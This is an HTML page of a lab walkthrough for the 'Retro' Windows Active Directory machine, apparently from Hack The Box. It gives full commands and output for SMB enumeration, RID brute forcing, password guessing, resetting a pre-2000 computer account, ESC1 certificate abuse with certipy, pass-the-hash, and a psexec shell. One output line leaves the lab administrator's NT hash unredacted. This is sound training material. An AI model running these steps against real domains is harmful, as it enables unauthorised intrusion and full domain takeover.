<!DOCTYPE HTML>
<html lang="en" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Retro - Walkthroughs</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="highlight-css" href="../../../highlight.css">
        <link rel="stylesheet" id="tomorrow-night-css" href="../../../tomorrow-night.css">
        <link rel="stylesheet" id="ayu-highlight-css" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "../../../";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
            window.path_to_searchindex_js = "../../../searchindex.js";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
                sidebar_toggle.checked = false;
            }
            if (sidebar === 'visible') {
                sidebar_toggle.checked = true;
            } else {
                html.classList.remove('sidebar-visible');
            }
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Walkthroughs</h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <div class="search-wrapper">
                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                            <div class="spinner-wrapper">
                                <i class="fa fa-spinner fa-spin"></i>
                            </div>
                        </div>
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="retro"><a class="header" href="#retro">Retro</a></h1>
<h1 id="initial-foothold"><a class="header" href="#initial-foothold">Initial FootHold</a></h1>
<h2 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h2>
<h3 id="smb"><a class="header" href="#smb">SMB</a></h3>
<p>SMB Null Auth was enabled but not useful to us.</p>
<p>Though <code>guest</code> was enabled too, and had <code>READ</code> permissions over the <code>Trainees</code> share.</p>
<pre><code class="language-powershell">└─$ netexec smb dc.retro.vl -u guest -p "" --shares                                                                                                                     
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)                    
SMB         10.129.26.138   445    DC               [+] retro.vl\guest:                                                                                                 
SMB         10.129.26.138   445    DC               [*] Enumerated shares                                                                                               
SMB         10.129.26.138   445    DC               Share           Permissions     Remark                                                                              
SMB         10.129.26.138   445    DC               -----           -----------     ------                                                                              
SMB         10.129.26.138   445    DC               ADMIN$                          Remote Admin                                                                        
SMB         10.129.26.138   445    DC               C$                              Default share
SMB         10.129.26.138   445    DC               IPC$            READ            Remote IPC
SMB         10.129.26.138   445    DC               NETLOGON                        Logon server share 
SMB         10.129.26.138   445    DC               Notes                           
SMB         10.129.26.138   445    DC               SYSVOL                          Logon server share 
SMB         10.129.26.138   445    DC               Trainees        READ 
</code></pre>
<p>Upon connecting to the share, we can see that there’s a file called <code>Important.txt</code>.</p>
<pre><code class="language-powershell">└─$ smbclient -N //$(cat ip)/Trainees
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Sun Jul 23 17:58:43 2023
  ..                                DHS        0  Wed Jun 11 10:17:10 2025
  Important.txt                       A      288  Sun Jul 23 18:00:13 2023
                4659711 blocks of size 4096. 1282156 blocks available
smb: \&gt; get Important.txt
getting file \Important.txt of size 288 as Important.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
</code></pre>
<p>Upon downloading the file and reading it, we find the following message</p>
<pre><code class="language-powershell">Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
</code></pre>
<p>This might be important for later.</p>
<p>I was not able to use the <code>--users</code> option to enumerate available users, but <code>RIDCycling</code> was allowed.</p>
<pre><code class="language-powershell">└─$ netexec smb dc.retro.vl -u guest -p "" --rid-brute &gt; rid-brute.txt
                                                                                                                                                                        
┌──(kali㉿kali)-[~/htblabs/Windows/Retro]
└─$ cat rid-brute.txt                                                 
SMB                      10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB                      10.129.26.138   445    DC               [+] retro.vl\guest: 
SMB                      10.129.26.138   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.129.26.138   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB                      10.129.26.138   445    DC               501: RETRO\Guest (SidTypeUser)
SMB                      10.129.26.138   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB                      10.129.26.138   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB                      10.129.26.138   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB                      10.129.26.138   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB                      10.129.26.138   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB                      10.129.26.138   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB                      10.129.26.138   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB                      10.129.26.138   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB                      10.129.26.138   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB                      10.129.26.138   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB                      10.129.26.138   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB                      10.129.26.138   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB                      10.129.26.138   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB                      10.129.26.138   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB                      10.129.26.138   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB                      10.129.26.138   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB                      10.129.26.138   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB                      10.129.26.138   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB                      10.129.26.138   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB                      10.129.26.138   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB                      10.129.26.138   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB                      10.129.26.138   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB                      10.129.26.138   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB                      10.129.26.138   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB                      10.129.26.138   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB                      10.129.26.138   445    DC               1109: RETRO\tblack (SidTypeUser)
</code></pre>
<p>Extracting users &amp; groups</p>
<pre><code class="language-powershell">└─$ cat rid-brute.txt | cut -d '\' -f2 | grep "SidTypeUser" | cut -d '(' -f1 &gt; users.txt
                                                                                                                                                                        
┌──(kali㉿kali)-[~/htblabs/Windows/Retro]
└─$ cat rid-brute.txt | cut -d '\' -f2 | grep "SidTypeGroup" | cut -d '(' -f1 &gt; groups.txt
                                                                                                                                                                        
┌──(kali㉿kali)-[~/htblabs/Windows/Retro]
└─$ cat users.txt                                                                         
Administrator 
Guest 
krbtgt 
DC$ 
trainee 
BANKING$ 
jburley 
tblack 
                                                                                                                                                                        
┌──(kali㉿kali)-[~/htblabs/Windows/Retro]
└─$ cat groups.txt 
Enterprise Read-only Domain Controllers 
Domain Admins 
Domain Users 
Domain Guests 
Domain Computers 
Domain Controllers 
Schema Admins 
Enterprise Admins 
Group Policy Creator Owners 
Read-only Domain Controllers 
Cloneable Domain Controllers 
Protected Users 
Key Admins 
Enterprise Key Admins 
DnsUpdateProxy 
HelpDesk
</code></pre>
<p>As we see, there’s a <code>trainee</code> user, which is probably the user that was referred to in the note.</p>
<p>As we saw from the note, the users did not want a hard password, and the admins were fed up with resetting passwords, it’s safe to guess that this account has a fairly simple password, let’s the the account name itself.</p>
<pre><code class="language-powershell">└─$ netexec smb $(cat ip) -u "trainee" -p "trainee"         
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.26.138   445    DC               [+] retro.vl\trainee:trainee
</code></pre>
<p>And it worked !</p>
<h1 id="privilege-escalation--1-gaining-access-to-a-domain-computer-account"><a class="header" href="#privilege-escalation--1-gaining-access-to-a-domain-computer-account">Privilege Escalation # 1: Gaining Access to a Domain Computer Account</a></h1>
<p>The first thing I do usually after gaining the first pair of credentials is enumerating bloodhound. But I got 0 benefits out of this. So I decided to go back to point 0 and re-start enumerating shares to see if I have more permissions.</p>
<pre><code class="language-powershell">└─$ netexec smb $(cat ip) -u "trainee" -p "trainee" --shares                                                                                                            
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)                    
SMB         10.129.26.138   445    DC               [+] retro.vl\trainee:trainee                                                                                        
SMB         10.129.26.138   445    DC               [*] Enumerated shares                                                                                               
SMB         10.129.26.138   445    DC               Share           Permissions     Remark                                                                              
SMB         10.129.26.138   445    DC               -----           -----------     ------                                                                              
SMB         10.129.26.138   445    DC               ADMIN$                          Remote Admin                                                                        
SMB         10.129.26.138   445    DC               C$                              Default share
SMB         10.129.26.138   445    DC               IPC$            READ            Remote IPC
SMB         10.129.26.138   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.26.138   445    DC               Notes           READ            
SMB         10.129.26.138   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.26.138   445    DC               Trainees        READ
</code></pre>
<p>As we can see, the new user had <code>READ</code> permissions on a lot more shares, so I ran <code>spider_plus</code> to see what those shares hold</p>
<pre><code class="language-powershell">└─$ netexec smb $(cat ip) -u "trainee" -p "trainee" -M spider_plus
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.26.138   445    DC               [+] retro.vl\trainee:trainee 
SPIDER_PLUS 10.129.26.138   445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.26.138   445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.26.138   445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.26.138   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.26.138   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.26.138   445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.26.138   445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.26.138   445    DC               [*] Enumerated shares
SMB         10.129.26.138   445    DC               Share           Permissions     Remark
SMB         10.129.26.138   445    DC               -----           -----------     ------
SMB         10.129.26.138   445    DC               ADMIN$                          Remote Admin
SMB         10.129.26.138   445    DC               C$                              Default share
SMB         10.129.26.138   445    DC               IPC$            READ            Remote IPC
SMB         10.129.26.138   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.26.138   445    DC               Notes           READ            
SMB         10.129.26.138   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.26.138   445    DC               Trainees        READ            
SPIDER_PLUS 10.129.26.138   445    DC               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.26.138.json".
SPIDER_PLUS 10.129.26.138   445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Notes, SYSVOL, Trainees)
SPIDER_PLUS 10.129.26.138   445    DC               [*] SMB Readable Shares:  5 (IPC$, NETLOGON, Notes, SYSVOL, Trainees)
SPIDER_PLUS 10.129.26.138   445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.26.138   445    DC               [*] Total folders found:  19
SPIDER_PLUS 10.129.26.138   445    DC               [*] Total files found:    8
SPIDER_PLUS 10.129.26.138   445    DC               [*] File size average:    1.09 KB
SPIDER_PLUS 10.129.26.138   445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.26.138   445    DC               [*] File size max:        3.68 KB
</code></pre>
<p>Reading the file that was stored at <code>"/home/kali/.nxc/modules/nxc_spider_plus/10.129.26.138.json"</code></p>
<pre><code class="language-powershell">└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.26.138.json                                                                                                      
{                                                                                                                                                                       
    "NETLOGON": {},                                                                                                                                                     
    "Notes": {                                                                                                                                                          
        "ToDo.txt": {                                                                                                                                                   
            "atime_epoch": "2023-07-23 18:05:56",                                                                                                                       
            "ctime_epoch": "2023-07-23 18:02:53",                                                                                                                       
            "mtime_epoch": "2023-07-23 18:05:56",                                                                                                                       
            "size": "248 B"                                                                                                                                             
        },                                                                                                                                                              
        "user.txt": {                                                                                                                                                   
            "atime_epoch": "2025-04-08 23:13:01",                                                                                                                       
            "ctime_epoch": "2025-04-08 23:12:47",                                                                                                                       
            "mtime_epoch": "2025-04-08 23:13:01",                                                                                                                       
            "size": "32 B"                                                                                                                                              
        }                                                                                                                                                               
    },
&lt;SNIP&gt;
</code></pre>
<p>We see that we have two important files in that share, <code>user.txt</code> which is the user flag for the challenge, and <code>ToDo.txt</code> which seems important.</p>
<p>Upon downloading the files, reading <code>ToDo.txt</code> displayed this message</p>
<pre><code class="language-powershell">└─$ cat ToDo.txt                                                  
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
</code></pre>
<p>The keywords here are <code>finance</code>, <code>banking</code>, and <code>pre created computer account</code>.</p>
<p>If we go back to the list of users we enumerated before, we see that there’s a computer account called <code>BANKING$</code>. The note did mention that it’s a pre-created computer account.
pre-created computer accounts were a thing in the past, where an account gets pre-created with the password being the username all lowercase.</p>
<p>Let’s try this and see if it works.</p>
<pre><code class="language-powershell">└─$ netexec smb $(cat ip) -u 'BANKING$' -p "banking"   
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.26.138   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
</code></pre>
<p>We got the error <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>.</p>
<p>The error is not “wrong password”, so this means we guessed it correctly.</p>
<p>This error is common with pre2k accounts, to get around this issue you either have to change the password of the account, or use kerberos authentication.</p>
<h3 id="using-kerberos-authentication"><a class="header" href="#using-kerberos-authentication">Using Kerberos Authentication</a></h3>
<pre><code class="language-powershell">└─$ netexec smb $(cat ip) -u 'BANKING$' -p "banking" -k
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.26.138   445    DC               [+] retro.vl\BANKING$:banking
</code></pre>
<h3 id="changing-pre2k-account-password"><a class="header" href="#changing-pre2k-account-password">Changing pre2k account password</a></h3>
<pre><code class="language-powershell">└─$ impacket-changepasswd -newpass glitch 'retro.vl/BANKING$:banking@dc.retro.vl'                                                                                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                                                              
                                                                                                                                                                        
[*] Changing the password of retro.vl\BANKING$                                                                                                                          
[*] Connecting to DCE/RPC as retro.vl\BANKING$                                                                                                                          
Traceback (most recent call last):                                                                                                                                      
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 280, in login                                                                                   
    return self._SMBConnection.login(user, password, domain, lmhash, nthash)                                                                                            
           ~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                                                                                            
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1092, in login                                                                                           
    if packet.isValidAnswer(STATUS_SUCCESS):                                                                                                                            
       ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^                                                                                                                             
  File "/usr/lib/python3/dist-packages/impacket/smb3structs.py", line 460, in isValidAnswer                                                                             
    raise smb3.SessionError(self['Status'], self)                                                                                                                       
impacket.smb3.SessionError: SMB SessionError: STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT(The account used is a computer account. Use your global user account or local user account to access this server.)
</code></pre>
<p>The error shows that impacket tried to use <code>SMB</code>, which would not work in this case as we cannot authenticate to SMB.</p>
<p>So we will have to change the protocol to <code>RPC</code>.</p>
<pre><code class="language-powershell">└─$ impacket-changepasswd -protocol rpc-samr -newpass glitch 'retro.vl/BANKING$:banking@dc.retro.vl'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
</code></pre>
<p>Now authentication with SMB works</p>
<pre><code class="language-powershell">└─$ netexec smb $(cat ip) -u 'BANKING$' -p "glitch"    
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.26.138   445    DC               [+] retro.vl\BANKING$:glitch
</code></pre>
<h1 id="privilege-escalation-2-gaining-administrative-access"><a class="header" href="#privilege-escalation-2-gaining-administrative-access">Privilege Escalation #2: Gaining Administrative Access</a></h1>
<p>I did not find anything interesting with the user <code>BANKING$</code> on SMB or BloodHound.</p>
<p>So I decided to go to enumerating AD CS with <code>certipy-ad</code>.</p>
<pre><code class="language-powershell">└─$ certipy-ad find -u 'BANKING$' -p glitch -target-ip $(cat ip)                                                                                                        
Certipy v5.0.2 - by Oliver Lyak (ly4k)                                                                                                                                  
                                                                                                                                                                        
[*] Finding certificate templates                                                                                                                                       
[*] Found 34 certificate templates                                                                                                                                      
[*] Finding certificate authorities                                                                                                                                     
[*] Found 1 certificate authority                                                                                                                                       
[*] Found 12 enabled certificate templates                                                                                                                              
[*] Finding issuance policies                                                                                                                                           
[*] Found 15 issuance policies                                                                                                                                          
[*] Found 0 OIDs linked to templates                                                                                                                                    
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP                                                                                                               
[!] Failed to connect to remote registry. Service should be starting now. Trying again...                                                                               
[*] Successfully retrieved CA configuration for 'retro-DC-CA'                                                                                                           
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'                                                                                                        
[!] Error checking web enrollment: timed out                                                                                                                            
[!] Use -debug to print a stacktrace                                                                                                                                    
[!] Error checking web enrollment: timed out                                                                                                                            
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250902121027_Certipy.txt'
[*] Wrote text output to '20250902121027_Certipy.txt'
[*] Saving JSON output to '20250902121027_Certipy.json'
[*] Wrote JSON output to '20250902121027_Certipy.json'
</code></pre>
<p>Reading the file <code>20250902121027_Certipy.txt</code>, we find a template that is vulnerable to <code>ESC1</code>.</p>
<p><code>CA Name                             : retro-DC-CA</code> (This is the Certificate Authority Name)</p>
<p><code>Template Name                       : RetroClients</code> (This is the Template Name)</p>
<p><code>Certificate Name Flag               : EnrolleeSuppliesSubject</code> (This means that I can choose what user to request the certificate for! - <strong>INTERESTING</strong>)</p>
<p><code>Extended Key Usage                  : Client Authentication</code> (This means that I can use the certificate to authenticate, without this the certificate is useless)</p>
<hr />
<pre><code class="language-powershell">Enrollment Rights               : RETRO.VL\Domain Admins                                                                                                        
                                  RETRO.VL\Domain Computers                                                                                                     
                                  RETRO.VL\Enterprise Admins
</code></pre>
<p>This means that only users from these groups can enroll in the certificate, our user, <code>BANKING$</code>, is part of the <code>Domain Computers</code> group !</p>
<h2 id="exploiting-esc1-using-certipy-ad"><a class="header" href="#exploiting-esc1-using-certipy-ad">Exploiting ESC1 using Certipy-AD</a></h2>
<pre><code class="language-powershell">└─$ certipy-ad req -ca retro-DC-CA -u 'BANKING$' -template RetroClients -upn administrator@retro.vl -target $(cat ip)
Certipy v5.0.2 - by Oliver Lyak (ly4k)

Password:
[*] Requesting certificate via RPC
[*] Request ID is 10
[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
Would you like to save the private key? (y/N): y
[*] Saving private key to '10.key'
[*] Wrote private key to '10.key'
[-] Failed to request certificate
</code></pre>
<p>The attack failed, if we look at the error, it says <code>The public key does not meet the minimum size required by the specified certificate template.</code></p>
<p>Looking at <code>certipy-ad</code> help menu</p>
<pre><code class="language-powershell">└─$ certipy-ad req --help
&lt;SNIP&gt;
-key-size RSA key length
                        Length of RSA key (default: 2048)
&lt;SNIP&gt;
</code></pre>
<p>Doubling the size of the key fixed the issue</p>
<pre><code class="language-powershell">└─$ certipy-ad req -ca retro-DC-CA -u 'BANKING$' -template RetroClients -upn administrator@retro.vl -target $(cat ip) -key-size 4096
Certipy v5.0.2 - by Oliver Lyak (ly4k)

Password:
[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
</code></pre>
<p>Trying to authenticate with the certificate, we got an <code>SID</code> mismatch error</p>
<pre><code class="language-powershell">└─$ certipy-ad auth -pfx administrator.pfx -dc-ip $(cat ip)                                                                  
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[-] Object SID mismatch between certificate and user 'administrator'
[-] See the wiki for more information
</code></pre>
<h3 id="using-impacket-lookupsid-to-enumerate-sid-of-user-administrator"><a class="header" href="#using-impacket-lookupsid-to-enumerate-sid-of-user-administrator">Using impacket-lookupsid to enumerate <code>SID</code> of user <code>administrator</code></a></h3>
<pre><code class="language-powershell">└─$ impacket-lookupsid 'retro.vl/BANKING$:glitch@10.129.26.138'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                                                              
                                                                                                                                                                        
[*] Brute forcing SIDs at 10.129.26.138                                                                                                                                 
[*] StringBinding ncacn_np:10.129.26.138[\pipe\lsarpc]                                                                                                                  
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
&lt;SNIP&gt;
500: RETRO\Administrator (SidTypeUser)
&lt;SNIP&gt;
</code></pre>
<p>So the SID for user <code>administrator</code> is <code>S-1-5-21-2983547755-698260136-4283918172-500</code>.</p>
<h3 id="requesting-new-certificate-with-specifying-the-sid"><a class="header" href="#requesting-new-certificate-with-specifying-the-sid">Requesting new certificate with specifying the <code>SID</code></a></h3>
<pre><code class="language-powershell">└─$ certipy-ad req -ca retro-DC-CA -u 'BANKING$' -template RetroClients -upn administrator@retro.vl -target $(cat ip) -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
Certipy v5.0.2 - by Oliver Lyak (ly4k)

Password:
[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
</code></pre>
<h3 id="authenticating-using-the-certificate--getting-the-hash"><a class="header" href="#authenticating-using-the-certificate--getting-the-hash">Authenticating using the certificate &amp; getting the hash</a></h3>
<pre><code class="language-powershell">└─$ certipy-ad auth -pfx administrator.pfx -dc-ip $(cat ip)
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aa&lt;REDACTED&gt;ee:25&lt;REDACTED&gt;89
</code></pre>
<p>Using NetExec to confirm local admin access</p>
<pre><code class="language-powershell">└─$ netexec smb $(cat ip) -u administrator -H aa&lt;REDACTED&gt;ee:25&lt;REDACTED&gt;89
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.26.138   445    DC               [+] retro.vl\administrator:252fac7066d93dd009d4fd2cd0368389 (Pwn3d!)
</code></pre>
<p>Gaining a shell using <code>PsExec</code></p>
<pre><code class="language-powershell">└─$ impacket-psexec active.htb/administrator@$(cat ip) -hashes aa&lt;REDACTED&gt;ee:25&lt;REDACTED&gt;89 
